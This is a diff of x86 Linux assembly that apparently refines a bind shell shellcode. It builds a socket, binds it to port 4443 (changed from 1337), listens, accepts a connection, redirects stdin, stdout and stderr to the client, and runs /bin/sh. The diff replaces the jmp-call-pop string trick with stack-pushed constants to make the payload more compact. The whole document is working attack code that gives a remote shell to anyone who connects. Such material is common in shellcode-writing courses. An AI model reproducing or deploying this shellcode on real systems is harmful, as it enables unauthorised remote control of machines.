@@ -4,39 +4,38 @@ global _start
 
 _start:
 	
-	; SYS_SOCKET (1) | socket(AF_INET, SOCK_STREAM, 0) = (2, 1, 0)
+	; socket(AF_INET, SOCK_STREAM, 0) = (2, 1, 0)
 
-	xor eax, eax
-	xor ecx, ecx
-	mov al, 102
+	xor ebx, ebx
+	push ebx
 
-	; socket arguments
-	socket_args:
-		push ecx
-		inc ecx
-		cmp cl, 2
-		jle socket_args
+	inc ebx
+	push ebx
 
-	mov cl, 1
-	mov ebx, ecx
+	inc ebx
+	push ebx
+
+	dec ebx
+
 	mov ecx, esp
+
+	push 102
+	pop eax ; SYS_socketcall
 
 	int 0x80
 
 	mov esi, eax
 
-	; SYS_BIND (2) | bind(sockfd, &saddr, 0x10)
+	; bind(sockfd, &saddr, 0x10)
 	
-	mov al, 102
-	inc bl
+	pop ebx
 	xor edx, edx
 
 	; Creating sockaddr structure
 	push edx
-	push edx
-	mov byte [esp], 0x2
-	mov word [esp+2], 0x3905 ; Port 1337
-	
+	push word 0x5a11 ; PORT: 4443
+	push bx
+
 	; bind arguments
 	mov dl, 0x10
 	mov ecx, esp
@@ -45,11 +44,11 @@ _start:
 	push esi
 	mov ecx, esp
 
+	mov al, 102 ; SYS_socketcall
 	int 0x80
 
 	; SYS_LISTEN (4) | listen(sockfd, 0x10)
 
-	mov al, 102
 	add bl, 2
 
 	; listen arguments
@@ -57,11 +56,11 @@ _start:
 	push esi
 	mov ecx, esp
 
+	mov al, 102 ; SYS_socketcall
 	int 0x80
 
-	; SYS_ACCEPT (5) | accept(sockfd, NULL, NULL)
+	; accept(sockfd, NULL, NULL)
 	
-	mov al, 102
 	inc bl
 	
 	; accept arguments
@@ -71,6 +70,7 @@ _start:
 	push esi
 	mov ecx, esp
 
+	mov al, 102 ; SYS_socketcall
 	int 0x80
 
 	mov ebx, eax
@@ -78,24 +78,21 @@ _start:
 	; dup2(clientfd, [0,1,2])
 	xor ecx, ecx
 	duplicate:
-		mov al, 63
+		mov al, 63 ; SYS_dup2
 		int 0x80
 		inc cl
 		cmp cl, 0x2
 		jle duplicate
 
 	; execve("/bin/sh", NULL, NULL)
-	
-	jmp binsh
-
-	shell:
-	mov al, 11
 	xor ecx, ecx
 	xor edx, edx
-	pop ebx
+	
+	push edx
+	push 0x68732f2f ; //sh
+	push 0x6e69622f ; /bin
+	mov ebx, esp
 
+	push 0xb ; SYS_execve
+	pop eax
 	int 0x80
-
-	binsh:
-		call shell
-		db "/bin/sh"
